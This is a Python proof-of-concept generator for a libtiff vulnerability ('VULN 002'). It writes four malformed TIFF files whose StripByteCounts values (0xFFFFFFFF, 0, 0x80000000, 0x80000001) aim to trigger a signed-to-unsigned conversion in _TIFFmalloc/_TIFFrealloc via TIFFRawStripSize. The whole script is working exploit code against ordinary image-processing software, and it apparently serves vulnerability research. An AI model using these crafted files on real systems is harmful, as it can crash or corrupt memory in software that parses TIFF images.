#!/usr/bin/env python3
"""
VULN 002 PoC generator: Signed-to-unsigned conversion in _TIFFmalloc/_TIFFrealloc
Tries multiple StripByteCounts values to trigger TIFFRawStripSize() returning (tsize_t)-1.
"""
import struct, os, sys

OUTDIR = os.path.dirname(os.path.abspath(__file__))

def le16(v): return struct.pack('<H', v)
def le32(v): return struct.pack('<I', v)

def ifd_entry(tag, typ, count, value):
    return struct.pack('<HHII', tag, typ, count, value)

SHORT, LONG = 3, 4

def make_tiff(strip_byte_count, compression=1, outname="vuln_002.tif"):
    """Build a minimal TIFF with the given StripByteCounts value."""
    num_entries = 9
    ifd_offset = 8
    ifd_size = 2 + num_entries * 12 + 4
    strip_data_offset = ifd_offset + ifd_size
    strip_data = b'\x00' * 64

    entries = []
    entries.append(ifd_entry(0x0100, SHORT, 1, 64))
    entries.append(ifd_entry(0x0101, SHORT, 1, 64))
    entries.append(ifd_entry(0x0102, SHORT, 1, 8))
    entries.append(ifd_entry(0x0103, SHORT, 1, compression))
    entries.append(ifd_entry(0x0106, SHORT, 1, 1))
    entries.append(ifd_entry(0x0111, LONG,  1, strip_data_offset))
    entries.append(ifd_entry(0x0115, SHORT, 1, 1))
    entries.append(ifd_entry(0x0116, SHORT, 1, 64))
    entries.append(ifd_entry(0x0117, LONG,  1, strip_byte_count & 0xFFFFFFFF))
    assert len(entries) == num_entries

    ifd = le16(num_entries) + b''.join(entries) + le32(0)
    header = b'II' + le16(42) + le32(ifd_offset)
    tiff = header + ifd + strip_data

    out = os.path.join(OUTDIR, outname)
    with open(out, 'wb') as f:
        f.write(tiff)
    print(f"Written {len(tiff)} bytes to {out}  [StripByteCounts=0x{strip_byte_count & 0xFFFFFFFF:08X}]")
    return out

# Variant 1: StripByteCounts=0xFFFFFFFF (UINT_MAX, > INT32_MAX)
make_tiff(0xFFFFFFFF, outname="vuln_002.tif")

# Variant 2: StripByteCounts=0 (explicit zero → TIFFRawStripSize returns -1)
make_tiff(0, outname="vuln_002_zero.tif")

# Variant 3: StripByteCounts=0x80000000 (INT32_MIN as signed → > INT32_MAX unsigned)
make_tiff(0x80000000, outname="vuln_002_intmin.tif")

# Variant 4: StripByteCounts=0x80000001 (just over INT32_MAX)
make_tiff(0x80000001, outname="vuln_002_over.tif")

print("All variants written.")
